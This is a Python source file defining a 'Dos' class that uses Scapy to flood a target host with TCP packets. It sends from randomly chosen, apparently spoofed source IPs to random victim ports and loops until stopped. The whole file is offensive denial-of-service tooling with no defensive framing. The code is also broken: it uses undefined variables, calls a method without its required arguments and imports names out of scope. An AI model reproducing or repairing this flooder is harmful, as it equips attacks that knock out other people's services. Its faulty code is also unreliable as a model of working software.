class Dos:
    def __init_subclass__(cls):
        pass
    def build_packet(self, ip, protocol, data):
        self.packet = ip / protocol / data

    def build_ip(self, src, dst):
        self.ip = IP(src=src, dst=dst)

    def ready_the_protocol(self):
        self.tcp = TCP(sport=self.source_port, dport=(
            self.victim_port))

    def random_port(self):
        self.victim_port = int(choice(self.victim_ports))
    
    def random_ip(self):
        self.source_ip = choice(self.source_ips)

    def report(self):
        print("Send Packet To Target {} from IP {} And Port {} To Port {}".format(
            self.victim_ip, self.source_ip, self.source_port, self.victim_port))

    def dos(self, shuffle_ip= True, shuffle_port = True, count=-1):
        from scapy.all import sendp as send, TCP, IP
        from random import choice
        print("Scapy Needs Administrator Permission")
        print("UAC Will Run On Windows Or On linux call ZKit with sudo")
        print("Press Ctrl + C To Stop The Process")
        i = 0
        while True:
            try:
                self.ready_the_protocol()
                if shuffle_port:
                    self.random_port()
                if shuffle_ip:
                    self.random_ip()
                self.build_packet(ip, tcp, message)
                self.build_ip()
                send(self.packet)
                self.report()
                if i == count:
                    print("Operation Was Successful. Sent {} Packets To {}".format(
            self.count, self.victim_ip))
                    break
                i += 1
            except KeyboardInterrupt:
                print("Already Send {} Packets To Target {} from IP {} And Port {} To Port {}".format(
                    i, self.victim_ip, self.source_ip, self.source_port, self.victim_port))
                break